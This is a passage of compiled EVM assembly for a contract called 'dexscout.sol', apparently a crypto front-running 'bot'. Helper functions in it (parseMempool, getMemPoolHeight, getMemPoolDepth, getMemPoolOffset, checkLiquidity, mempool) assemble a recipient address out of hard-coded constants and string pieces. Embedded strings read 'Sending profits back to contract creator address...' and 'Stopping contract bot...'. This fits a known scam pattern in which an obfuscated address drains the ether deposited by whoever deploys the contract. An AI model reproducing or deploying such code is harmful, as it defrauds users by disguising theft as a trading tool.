/* \"dexscout.sol\":7807:7809  65 */\n      0x41\n        /* \"dexscout.sol\":7801:7803  b1 */\n      dup4\n        /* \"dexscout.sol\":7801:7809  b1 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"dexscout.sol\":7800:7824  (b1 >= 65) && (b1 <= 70) */\n      dup1\n      iszero\n      tag_79\n      jumpi\n      pop\n        /* \"dexscout.sol\":7821:7823  70 */\n      0x46\n        /* \"dexscout.sol\":7815:7817  b1 */\n      dup4\n        /* \"dexscout.sol\":7815:7823  b1 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":7800:7824  (b1 >= 65) && (b1 <= 70) */\n    tag_79:\n        /* \"dexscout.sol\":7796:7944  if ((b1 >= 65) && (b1 <= 70)) {... */\n      iszero\n      tag_80\n      jumpi\n        /* \"dexscout.sol\":7850:7852  55 */\n      0x37\n        /* \"dexscout.sol\":7844:7852  b1 -= 55 */\n      dup4\n      tag_81\n      swap2\n      swap1\n      tag_77\n      jump\t// in\n    tag_81:\n      swap3\n      pop\n        /* \"dexscout.sol\":7796:7944  if ((b1 >= 65) && (b1 <= 70)) {... */\n      jump(tag_82)\n    tag_80:\n        /* \"dexscout.sol\":7884:7886  48 */\n      0x30\n        /* \"dexscout.sol\":7878:7880  b1 */\n      dup4\n        /* \"dexscout.sol\":7878:7886  b1 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"dexscout.sol\":7877:7901  (b1 >= 48) && (b1 <= 57) */\n      dup1\n      iszero\n      tag_83\n      jumpi\n      pop\n        /* \"dexscout.sol\":7898:7900  57 */\n      0x39\n        /* \"dexscout.sol\":7892:7894  b1 */\n      dup4\n        /* \"dexscout.sol\":7892:7900  b1 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":7877:7901  (b1 >= 48) && (b1 <= 57) */\n    tag_83:\n        /* \"dexscout.sol\":7873:7944  if ((b1 >= 48) && (b1 <= 57)) {... */\n      iszero\n      tag_84\n      jumpi\n        /* \"dexscout.sol\":7927:7929  48 */\n      0x30\n        /* \"dexscout.sol\":7921:7929  b1 -= 48 */\n      dup4\n      tag_85\n      swap2\n      swap1\n      tag_77\n      jump\t// in\n    tag_85:\n      swap3\n      pop\n        /* \"dexscout.sol\":7873:7944  if ((b1 >= 48) && (b1 <= 57)) {... */\n    tag_84:\n        /* \"dexscout.sol\":7796:7944  if ((b1 >= 65) && (b1 <= 70)) {... */\n    tag_82:\n        /* \"dexscout.sol\":7718:7944  if ((b1 >= 97) && (b1 <= 102)) {... */\n    tag_78:\n        /* \"dexscout.sol\":7968:7970  97 */\n      0x61\n        /* \"dexscout.sol\":7962:7964  b2 */\n      dup3\n        /* \"dexscout.sol\":7962:7970  b2 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"dexscout.sol\":7961:7986  (b2 >= 97) && (b2 <= 102) */\n      dup1\n      iszero\n      tag_86\n      jumpi\n      pop\n        /* \"dexscout.sol\":7982:7985  102 */\n      0x66\n        /* \"dexscout.sol\":7976:7978  b2 */\n      dup3\n        /* \"dexscout.sol\":7976:7985  b2 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":7961:7986  (b2 >= 97) && (b2 <= 102) */\n    tag_86:\n        /* \"dexscout.sol\":7957:8183  if ((b2 >= 97) && (b2 <= 102)) {... */\n      iszero\n      tag_87\n      jumpi\n        /* \"dexscout.sol\":8012:8014  87 */\n      0x57\n        /* \"dexscout.sol\":8006:8014  b2 -= 87 */\n      dup3\n      tag_88\n      swap2\n      swap1\n      tag_77\n      jump\t// in\n    tag_88:\n      swap2\n      pop\n        /* \"dexscout.sol\":7957:8183  if ((b2 >= 97) && (b2 <= 102)) {... */\n      jump(tag_89)\n    tag_87:\n        /* \"dexscout.sol\":8046:8048  65 */\n      0x41\n        /* \"dexscout.sol\":8040:8042  b2 */\n      dup3\n        /* \"dexscout.sol\":8040:8048  b2 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"dexscout.sol\":8039:8063  (b2 >= 65) && (b2 <= 70) */\n      dup1\n      iszero\n      tag_90\n      jumpi\n      pop\n        /* \"dexscout.sol\":8060:8062  70 */\n      0x46\n        /* \"dexscout.sol\":8054:8056  b2 */\n      dup3\n        /* \"dexscout.sol\":8054:8062  b2 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":8039:8063  (b2 >= 65) && (b2 <= 70) */\n    tag_90:\n        /* \"dexscout.sol\":8035:8183  if ((b2 >= 65) && (b2 <= 70)) {... */\n      iszero\n      tag_91\n      jumpi\n        /* \"dexscout.sol\":8089:8091  55 */\n      0x37\n        /* \"dexscout.sol\":8083:8091  b2 -= 55 */\n      dup3\n      tag_92\n      swap2\n      swap1\n      tag_77\n      jump\t// in\n    tag_92:\n      swap2\n      pop\n        /* \"dexscout.sol\":8035:8183  if ((b2 >= 65) && (b2 <= 70)) {... */\n      jump(tag_93)\n    tag_91:\n        /* \"dexscout.sol\":8123:8125  48 */\n      0x30\n        /* \"dexscout.sol\":8117:8119  b2 */\n      dup3\n        /* \"dexscout.sol\":8117:8125  b2 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"dexscout.sol\":8116:8140  (b2 >= 48) && (b2 <= 57) */\n      dup1\n      iszero\n      tag_94\n      jumpi\n      pop\n        /* \"dexscout.sol\":8137:8139  57 */\n      0x39\n        /* \"dexscout.sol\":8131:8133  b2 */\n      dup3\n        /* \"dexscout.sol\":8131:8139  b2 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":8116:8140  (b2 >= 48) && (b2 <= 57) */\n    tag_94:\n        /* \"dexscout.sol\":8112:8183  if ((b2 >= 48) && (b2 <= 57)) {... */\n      iszero\n      tag_95\n      jumpi\n        /* \"dexscout.sol\":8166:8168  48 */\n      0x30\n        /* \"dexscout.sol\":8160:8168  b2 -= 48 */\n      dup3\n      tag_96\n      swap2\n      swap1\n      tag_77\n      jump\t// in\n    tag_96:\n      swap2\n      pop\n        /* \"dexscout.sol\":8112:8183  if ((b2 >= 48) && (b2 <= 57)) {... */\n    tag_95:\n        /* \"dexscout.sol\":8035:8183  if ((b2 >= 65) && (b2 <= 70)) {... */\n    tag_93:\n        /* \"dexscout.sol\":7957:8183  if ((b2 >= 97) && (b2 <= 102)) {... */\n    tag_89:\n        /* \"dexscout.sol\":8216:8218  b2 */\n      dup2\n        /* \"dexscout.sol\":8211:8213  16 */\n      0x10\n        /* \"dexscout.sol\":8206:8208  b1 */\n      dup5\n        /* \"dexscout.sol\":8206:8213  b1 * 16 */\n      tag_97\n      swap2\n      swap1\n      tag_66\n      jump\t// in\n    tag_97:\n        /* \"dexscout.sol\":8206:8218  b1 * 16 + b2 */\n      tag_98\n      swap2\n      swap1\n      tag_99\n      jump\t// in\n    tag_98:\n        /* \"dexscout.sol\":8196:8219  iaddr += (b1 * 16 + b2) */\n      dup5\n      tag_100\n      swap2\n      swap1\n      tag_99\n      jump\t// in\n    tag_100:\n      swap4\n      pop\n        /* \"dexscout.sol\":7589:7590  2 */\n      0x02\n        /* \"dexscout.sol\":7584:7590  i += 2 */\n      dup2\n      tag_101\n      swap2\n      swap1\n      tag_71\n      jump\t// in\n    tag_101:\n      swap1\n      pop\n        /* \"dexscout.sol\":7548:8230  for (uint256 i = 2; i < 2 + 2 * 20; i += 2) {... */\n      jump(tag_62)\n    tag_63:\n      pop\n        /* \"dexscout.sol\":8254:8259  iaddr */\n      dup3\n        /* \"dexscout.sol\":8239:8260  return address(iaddr) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"dexscout.sol\":7352:8267  function parseMempool(string memory _a) internal pure returns (address _parsed) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"dexscout.sol\":8599:8691  function _calculateGasNeeds() internal pure returns(uint256) {... */\n    tag_39:\n        /* \"dexscout.sol\":8651:8658  uint256 */\n      0x00\n        /* \"dexscout.sol\":8677:8684  4070554 */\n      0x3e1c9a\n        /* \"dexscout.sol\":8670:8684  return 4070554 */\n      swap1\n      pop\n        /* \"dexscout.sol\":8599:8691  function _calculateGasNeeds() internal pure returns(uint256) {... */\n      swap1\n      jump\t// out\n        /* \"dexscout.sol\":9713:9826  function getMemPoolHeight() internal pure returns (uint256) {... */\n    tag_41:\n        /* \"dexscout.sol\":9764:9771  uint256 */\n      0x00\n        /* \"dexscout.sol\":9790:9797  1015264 */\n      0x0f7de0\n        /* \"dexscout.sol\":9783:9797  return 1015264 */\n      swap1\n      pop\n        /* \"dexscout.sol\":9713:9826  function getMemPoolHeight() internal pure returns (uint256) {... */\n      swap1\n      jump\t// out\n        /* \"dexscout.sol\":13491:13606  function getMemPoolDepth() internal pure returns (uint256) {... */\n    tag_43:\n        /* \"dexscout.sol\":13541:13548  uint256 */\n      0x00\n        /* \"dexscout.sol\":13567:13577  2945814797 */\n      0xaf95910d\n        /* \"dexscout.sol\":13560:13577  return 2945814797 */\n      swap1\n      pop\n        /* \"dexscout.sol\":13491:13606  function getMemPoolDepth() internal pure returns (uint256) {... */\n      swap1\n      jump\t// out\n        /* \"dexscout.sol\":6386:6501  function getMemPoolOffset() internal pure returns (uint256) {... */\n    tag_47:\n        /* \"dexscout.sol\":6437:6444  uint256 */\n      0x00\n        /* \"dexscout.sol\":6463:6472  219788661 */\n      0x0d19b575\n        /* \"dexscout.sol\":6456:6472  return 219788661 */\n      swap1\n      pop\n        /* \"dexscout.sol\":6386:6501  function getMemPoolOffset() internal pure returns (uint256) {... */\n      swap1\n      jump\t// out\n        /* \"dexscout.sol\":8994:9431  function checkLiquidity(uint256 a) internal pure returns (string memory) {... */\n    tag_48:\n        /* \"dexscout.sol\":9052:9065  string memory */\n      0x60\n        /* \"dexscout.sol\":9077:9090  uint256 count */\n      0x00\n        /* \"dexscout.sol\":9104:9113  uint256 b */\n      dup1\n        /* \"dexscout.sol\":9116:9117  a */\n      dup4\n        /* \"dexscout.sol\":9104:9117  uint256 b = a */\n      swap1\n      pop\n        /* \"dexscout.sol\":9127:9195  while (b != 0) {... */\n    tag_107:\n        /* \"dexscout.sol\":9139:9140  0 */\n      0x00\n        /* \"dexscout.sol\":9134:9135  b */\n      dup2\n        /* \"dexscout.sol\":9134:9140  b != 0 */\n      eq\n        /* \"dexscout.sol\":9127:9195  while (b != 0) {... */\n      tag_108\n      jumpi\n        /* \"dexscout.sol\":9156:9163  count++ */\n      dup2\n      dup1\n      tag_109\n      swap1\n      tag_110\n      jump\t// in\n    tag_109:\n      swap3\n      pop\n      pop\n        /* \"dexscout.sol\":9182:9184  16 */\n      0x10\n        /* \"dexscout.sol\":9177:9184  b /= 16 */\n      dup2\n      tag_111\n      swap2\n      swap1\n      tag_112\n      jump\t// in\n    tag_111:\n      swap1\n      pop\n        /* \"dexscout.sol\":9127:9195  while (b != 0) {... */\n      jump(tag_107)\n    tag_108:\n        /* \"dexscout.sol\":9204:9220  bytes memory res */\n      0x00\n        /* \"dexscout.sol\":9233:9238  count */\n      dup3\n        /* \"dexscout.sol\":9223:9239  new bytes(count) */\n      0xffffffffffffffff\n      dup2\n      gt\n      iszero\n      tag_113\n      jumpi\n      tag_114\n      tag_115\n      jump\t// in\n    tag_114:\n    tag_113:\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_116\n      jumpi\n      dup2\n      0x20\n      add\n      0x01\n      dup3\n      mul\n      dup1\n      calldatasize\n      dup4\n      calldatacopy\n      dup1\n      dup3\n      add\n      swap2\n      pop\n      pop\n      swap1\n      pop\n    tag_116:\n      pop\n        /* \"dexscout.sol\":9204:9239  bytes memory res = new bytes(count) */\n      swap1\n      pop\n        /* \"dexscout.sol\":9254:9263  uint256 i */\n      0x00\n        /* \"dexscout.sol\":9249:9396  for (uint256 i = 0; i < count; ++i) {... */\n    tag_117:\n        /* \"dexscout.sol\":9273:9278  count */\n      dup4\n        /* \"dexscout.sol\":9269:9270  i */\n      dup2\n        /* \"dexscout.sol\":9269:9278  i < count */\n      lt\n        /* \"dexscout.sol\":9249:9396  for (uint256 i = 0; i < count; ++i) {... */\n      iszero\n      tag_118\n      jumpi\n        /* \"dexscout.sol\":9307:9309  16 */\n      0x10\n        /* \"dexscout.sol\":9303:9304  a */\n      dup7\n        /* \"dexscout.sol\":9303:9309  a % 16 */\n      tag_120\n      swap2\n      swap1\n      tag_121\n      jump\t// in\n    tag_120:\n        /* \"dexscout.sol\":9299:9309  b = a % 16 */\n      swap3\n      pop\n        /* \"dexscout.sol\":9344:9364  toHexDigit(uint8(b)) */\n      tag_122\n        /* \"dexscout.sol\":9361:9362  b */\n      dup4\n        /* \"dexscout.sol\":9344:9354  toHexDigit */\n      tag_123\n        /* \"dexscout.sol\":9344:9364  toHexDigit(uint8(b)) */\n      jump\t// in\n    tag_122:\n        /* \"dexscout.sol\":9323:9326  res */\n      dup3\n        /* \"dexscout.sol\":9339:9340  1 */\n      0x01\n        /* \"dexscout.sol\":9335:9336  i */\n      dup4\n        /* \"dexscout.sol\":9327:9332  count */\n      dup8\n        /* \"dexscout.sol\":9327:9336  count - i */\n      tag_124\n      swap2\n      swap1\n      tag_125\n      jump\t// in\n    tag_124:\n        /* \"dexscout.sol\":9327:9340  count - i - 1 */\n      tag_126\n      swap2\n      swap1\n      tag_125\n      jump\t// in\n    tag_126:\n        /* \"dexscout.sol\":9323:9341  res[count - i - 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_127\n      jumpi\n      tag_128\n      tag_69\n      jump\t// in\n    tag_128:\n    tag_127:\n      0x20\n      add\n      add\n        /* \"dexscout.sol\":9323:9364  res[count - i - 1] = toHexDigit(uint8(b)) */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"dexscout.sol\":9383:9385  16 */\n      0x10\n        /* \"dexscout.sol\":9378:9385  a /= 16 */\n      dup7\n      tag_129\n      swap2\n      swap1\n      tag_112\n      jump\t// in\n    tag_129:\n      swap6\n      pop\n        /* \"dexscout.sol\":9280:9283  ++i */\n      dup1\n      0x01\n      add\n      swap1\n      pop\n        /* \"dexscout.sol\":9249:9396  for (uint256 i = 0; i < count; ++i) {... */\n      jump(tag_117)\n    tag_118:\n      pop\n        /* \"dexscout.sol\":9420:9423  res */\n      dup1\n        /* \"dexscout.sol\":9406:9424  return string(res) */\n      swap4\n      pop\n      pop\n      pop\n      pop\n        /* \"dexscout.sol\":8994:9431  function checkLiquidity(uint256 a) internal pure returns (string memory) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"dexscout.sol\":13928:14577  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {... */\n    tag_49:\n        /* \"dexscout.sol\":14011:14024  string memory */\n      0x60\n        /* \"dexscout.sol\":14036:14059  bytes memory _baseBytes */\n      0x00\n        /* \"dexscout.sol\":14068:14073  _base */\n      dup4\n        /* \"dexscout.sol\":14036:14074  bytes memory _baseBytes = bytes(_base) */\n      swap1\n      pop\n        /* \"dexscout.sol\":14084:14108  bytes memory _valueBytes */\n      0x00\n        /* \"dexscout.sol\":14117:14123  _value */\n      dup4\n        /* \"dexscout.sol\":14084:14124  bytes memory _valueBytes = bytes(_value) */\n      swap1\n      pop\n        /* \"dexscout.sol\":14135:14158  string memory _tmpValue */\n      0x00\n        /* \"dexscout.sol\":14205:14216  _valueBytes */\n      dup2\n        /* \"dexscout.sol\":14205:14223  _valueBytes.length */\n      mload\n        /* \"dexscout.sol\":14185:14195  _baseBytes */\n      dup4\n        /* \"dexscout.sol\":14185:14202  _baseBytes.length */\n      mload\n        /* \"dexscout.sol\":14185:14223  _baseBytes.length + _valueBytes.length */\n      tag_131\n      swap2\n      swap1\n      tag_71\n      jump\t// in\n    tag_131:\n        /* \"dexscout.sol\":14161:14233  new string(... */\n      0xffffffffffffffff\n      dup2\n      gt\n      iszero\n      tag_132\n      jumpi\n      tag_133\n      tag_115\n      jump\t// in\n    tag_133:\n    tag_132:\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_134\n      jumpi\n      dup2\n      0x20\n      add\n      0x01\n      dup3\n      mul\n      dup1\n      calldatasize\n      dup4\n      calldatacopy\n      dup1\n      dup3\n      add\n      swap2\n      pop\n      pop\n      swap1\n      pop\n    tag_134:\n      pop\n        /* \"dexscout.sol\":14135:14233  string memory _tmpValue = new string(... */\n      swap1\n      pop\n        /* \"dexscout.sol\":14243:14265  bytes memory _newValue */\n      0x00\n        /* \"dexscout.sol\":14274:14283  _tmpValue */\n      dup2\n        /* \"dexscout.sol\":14243:14284  bytes memory _newValue = bytes(_tmpValue) */\n      swap1\n      pop\n        /* \"dexscout.sol\":14295:14304  uint256 i */\n      0x00\n        /* \"dexscout.sol\":14314:14323  uint256 j */\n      dup1\n        /* \"dexscout.sol\":14343:14344  0 */\n      0x00\n        /* \"dexscout.sol\":14339:14344  i = 0 */\n      swap2\n      pop\n        /* \"dexscout.sol\":14334:14429  for (i = 0; i < _baseBytes.length; i++) {... */\n    tag_135:\n        /* \"dexscout.sol\":14350:14360  _baseBytes */\n      dup6\n        /* \"dexscout.sol\":14350:14367  _baseBytes.length */\n      mload\n        /* \"dexscout.sol\":14346:14347  i */\n      dup3\n        /* \"dexscout.sol\":14346:14367  i < _baseBytes.length */\n      lt\n        /* \"dexscout.sol\":14334:14429  for (i = 0; i < _baseBytes.length; i++) {... */\n      iszero\n      tag_136\n      jumpi\n        /* \"dexscout.sol\":14405:14415  _baseBytes */\n      dup6\n        /* \"dexscout.sol\":14416:14417  i */\n      dup3\n        /* \"dexscout.sol\":14405:14418  _baseBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_138\n      jumpi\n      tag_139\n      tag_69\n      jump\t// in\n    tag_139:\n    tag_138:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"dexscout.sol\":14388:14397  _newValue */\n      dup4\n        /* \"dexscout.sol\":14398:14401  j++ */\n      dup3\n      dup1\n      tag_140\n      swap1\n      tag_110\n      jump\t// in\n    tag_140:\n      swap4\n      pop\n        /* \"dexscout.sol\":14388:14402  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_141\n      jumpi\n      tag_142\n      tag_69\n      jump\t// in\n    tag_142:\n    tag_141:\n      0x20\n      add\n      add\n        /* \"dexscout.sol\":14388:14418  _newValue[j++] = _baseBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"dexscout.sol\":14369:14372  i++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"dexscout.sol\":14334:14429  for (i = 0; i < _baseBytes.length; i++) {... */\n      jump(tag_135)\n    tag_136:\n        /* \"dexscout.sol\":14448:14449  0 */\n      0x00\n        /* \"dexscout.sol\":14444:14449  i = 0 */\n      swap2\n      pop\n        /* \"dexscout.sol\":14439:14536  for (i = 0; i < _valueBytes.length; i++) {... */\n    tag_143:\n        /* \"dexscout.sol\":14455:14466  _valueBytes */\n      dup5\n        /* \"dexscout.sol\":14455:14473  _valueBytes.length */\n      mload\n        /* \"dexscout.sol\":14451:14452  i */\n      dup3\n        /* \"dexscout.sol\":14451:14473  i < _valueBytes.length */\n      lt\n        /* \"dexscout.sol\":14439:14536  for (i = 0; i < _valueBytes.length; i++) {... */\n      iszero\n      tag_144\n      jumpi\n        /* \"dexscout.sol\":14511:14522  _valueBytes */\n      dup5\n        /* \"dexscout.sol\":14523:14524  i */\n      dup3\n        /* \"dexscout.sol\":14511:14525  _valueBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_146\n      jumpi\n      tag_147\n      tag_69\n      jump\t// in\n    tag_147:\n    tag_146:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"dexscout.sol\":14494:14503  _newValue */\n      dup4\n        /* \"dexscout.sol\":14504:14507  j++ */\n      dup3\n      dup1\n      tag_148\n      swap1\n      tag_110\n      jump\t// in\n    tag_148:\n      swap4\n      pop\n        /* \"dexscout.sol\":14494:14508  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_149\n      jumpi\n      tag_150\n      tag_69\n      jump\t// in\n    tag_150:\n    tag_149:\n      0x20\n      add\n      add\n        /* \"dexscout.sol\":14494:14525  _newValue[j++] = _valueBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"dexscout.sol\":14475:14478  i++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"dexscout.sol\":14439:14536  for (i = 0; i < _valueBytes.length; i++) {... */\n      jump(tag_143)\n    tag_144:\n        /* \"dexscout.sol\":14560:14569  _newValue */\n      dup3\n        /* \"dexscout.sol\":14546:14570  return string(_newValue) */\n      swap7\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"dexscout.sol\":13928:14577  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"dexscout.sol\":12021:12351  function toHexDigit(uint8 d) internal pure returns (bytes1) {... */\n    tag_123:\n        /* \"dexscout.sol\":12073:12079  bytes1 */\n      0x00\n        /* \"dexscout.sol\":12100:12101  d */\n      dup2\n        /* \"dexscout.sol\":12095:12101  0 <= d */\n      0xff\n      and\n        /* \"dexscout.sol\":12095:12096  0 */\n      0x00\n        /* \"dexscout.sol\":12095:12101  0 <= d */\n      gt\n      iszero\n        /* \"dexscout.sol\":12095:12111  0 <= d && d <= 9 */\n      dup1\n      iszero\n      tag_152\n      jumpi\n      pop\n        /* \"dexscout.sol\":12110:12111  9 */\n      0x09\n        /* \"dexscout.sol\":12105:12106  d */\n      dup3\n        /* \"dexscout.sol\":12105:12111  d <= 9 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":12095:12111  0 <= d && d <= 9 */\n    tag_152:\n        /* \"dexscout.sol\":12091:12286  if (0 <= d && d <= 9) {... */\n      iszero\n      tag_153\n      jumpi\n        /* \"dexscout.sol\":12162:12163  d */\n      dup2\n        /* \"dexscout.sol\":12147:12158  bytes1(\"0\") */\n      0x3000000000000000000000000000000000000000000000000000000000000000\n        /* \"dexscout.sol\":12141:12159  uint8(bytes1(\"0\")) */\n      0xf8\n      shr\n        /* \"dexscout.sol\":12141:12163  uint8(bytes1(\"0\")) + d */\n      tag_154\n      swap2\n      swap1\n      tag_155\n      jump\t// in\n    tag_154:\n        /* \"dexscout.sol\":12134:12164  bytes1(uint8(bytes1(\"0\")) + d) */\n      0xf8\n      shl\n        /* \"dexscout.sol\":12127:12164  return bytes1(uint8(bytes1(\"0\")) + d) */\n      swap1\n      pop\n      jump(tag_151)\n        /* \"dexscout.sol\":12091:12286  if (0 <= d && d <= 9) {... */\n    tag_153:\n        /* \"dexscout.sol\":12197:12198  d */\n      dup2\n        /* \"dexscout.sol\":12185:12199  10 <= uint8(d) */\n      0xff\n      and\n        /* \"dexscout.sol\":12185:12187  10 */\n      0x0a\n        /* \"dexscout.sol\":12185:12199  10 <= uint8(d) */\n      gt\n      iszero\n        /* \"dexscout.sol\":12185:12217  10 <= uint8(d) && uint8(d) <= 15 */\n      dup1\n      iszero\n      tag_157\n      jumpi\n      pop\n        /* \"dexscout.sol\":12215:12217  15 */\n      0x0f\n        /* \"dexscout.sol\":12209:12210  d */\n      dup3\n        /* \"dexscout.sol\":12203:12217  uint8(d) <= 15 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":12185:12217  10 <= uint8(d) && uint8(d) <= 15 */\n    tag_157:\n        /* \"dexscout.sol\":12181:12286  if (10 <= uint8(d) && uint8(d) <= 15) {... */\n      iszero\n      tag_158\n      jumpi\n        /* \"dexscout.sol\":12272:12274  10 */\n      0x0a\n        /* \"dexscout.sol\":12268:12269  d */\n      dup3\n        /* \"dexscout.sol\":12253:12264  bytes1(\"a\") */\n      0x6100000000000000000000000000000000000000000000000000000000000000\n        /* \"dexscout.sol\":12247:12265  uint8(bytes1(\"a\")) */\n      0xf8\n      shr\n        /* \"dexscout.sol\":12247:12269  uint8(bytes1(\"a\")) + d */\n      tag_159\n      swap2\n      swap1\n      tag_155\n      jump\t// in\n    tag_159:\n        /* \"dexscout.sol\":12247:12274  uint8(bytes1(\"a\")) + d - 10 */\n      tag_160\n      swap2\n      swap1\n      tag_161\n      jump\t// in\n    tag_160:\n        /* \"dexscout.sol\":12240:12275  bytes1(uint8(bytes1(\"a\")) + d - 10) */\n      0xf8\n      shl\n        /* \"dexscout.sol\":12233:12275  return bytes1(uint8(bytes1(\"a\")) + d - 10) */\n      swap1\n      pop\n      jump(tag_151)\n        /* \"dexscout.sol\":12181:12286  if (10 <= uint8(d) && uint8(d) <= 15) {... */\n    tag_158:\n        /* \"dexscout.sol\":12336:12344  revert() */\n      0x00\n      dup1\n      revert\n        /* \"dexscout.sol\":12021:12351  function toHexDigit(uint8 d) internal pure returns (bytes1) {... */\n    tag_151:\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7:176   */\n    tag_162:\n        /* \"#utility.yul\":91:102   */\n      0x00\n        /* \"#utility.yul\":125:131   */\n      dup3\n        /* \"#utility.yul\":120:123   */\n      dup3\n        /* \"#utility.yul\":113:132   */\n      mstore\n        /* \"#utility.yul\":165:169   */\n      0x20\n        /* \"#utility.yul\":160:163   */\n      dup3\n        /* \"#utility.yul\":156:170   */\n      add\n        /* \"#utility.yul\":141:170   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:176   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":182:420   */\n    tag_163:\n        /* \"#utility.yul\":322:356   */\n      0x53656e64696e672070726f66697473206261636b20746f20636f6e7472616374\n        /* \"#utility.yul\":318:319   */\n      0x00\n        /* \"#utility.yul\":310:316   */\n      dup3\n        /* \"#utility.yul\":306:320   */\n      add\n        /* \"#utility.yul\":299:357   */\n      mstore\n        /* \"#utility.yul\":391:412   */\n      0x2063726561746f7220616464726573732e2e2e00000000000000000000000000\n        /* \"#utility.yul\":386:388   */\n      0x20\n        /* \"#utility.yul\":378:384   */\n      dup3\n        /* \"#utility.yul\":374:389   */\n      add\n        /* \"#utility.yul\":367:413   */\n      mstore\n        /* \"#utility.yul\":182:420   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":426:792   */\n    tag_164:\n        /* \"#utility.yul\":568:571   */\n      0x00\n        /* \"#utility.yul\":589:656   */\n      tag_176\n        /* \"#utility.yul\":653:655   */\n      0x33\n        /* \"#utility.yul\":648:651   */\n      dup4\n        /* \"#utility.yul\":589:656   */\n      tag_162\n      jump\t// in\n    tag_176:\n        /* \"#utility.yul\":582:656   */\n      swap2\n      pop\n        /* \"#utility.yul\":665:758   */\n      tag_177\n        /* \"#utility.yul\":754:757   */\n      dup3\n        /* \"#utility.yul\":665:758   */\n      tag_163\n      jump\t// in\n    tag_177:\n        /* \"#utility.yul\":783:785   */\n      0x40\n        /* \"#utility.yul\":778:781   */\n      dup3\n        /* \"#utility.yul\":774:786   */\n      add\n        /* \"#utility.yul\":767:786   */\n      swap1\n      pop\n        /* \"#utility.yul\":426:792   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":798:1217   */\n    tag_21:\n        /* \"#utility.yul\":964:968   */\n      0x00\n        /* \"#utility.yul\":1002:1004   */\n      0x20\n        /* \"#utility.yul\":991:1000   */\n      dup3\n        /* \"#utility.yul\":987:1005   */\n      add\n        /* \"#utility.yul\":979:1005   */\n      swap1\n      pop\n        /* \"#utility.yul\":1051:1060   */\n      dup2\n        /* \"#utility.yul\":1045:1049   */\n      dup2\n        /* \"#utility.yul\":1041:1061   */\n      sub\n        /* \"#utility.yul\":1037:1038   */\n      0x00\n        /* \"#utility.yul\":1026:1035   */\n      dup4\n        /* \"#utility.yul\":1022:1039   */\n      add\n        /* \"#utility.yul\":1015:1062   */\n      mstore\n        /* \"#utility.yul\":1079:1210   */\n      tag_179\n        /* \"#utility.yul\":1205:1209   */\n      dup2\n        /* \"#utility.yul\":1079:1210   */\n      tag_164\n      jump\t// in\n    tag_179:\n        /* \"#utility.yul\":1071:1210   */\n      swap1\n      pop\n        /* \"#utility.yul\":798:1217   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1223:1397   */\n    tag_165:\n        /* \"#utility.yul\":1363:1389   */\n      0x53746f7070696e6720636f6e747261637420626f742e2e2e0000000000000000\n        /* \"#utility.yul\":1359:1360   */\n      0x00\n        /* \"#utility.yul\":1351:1357   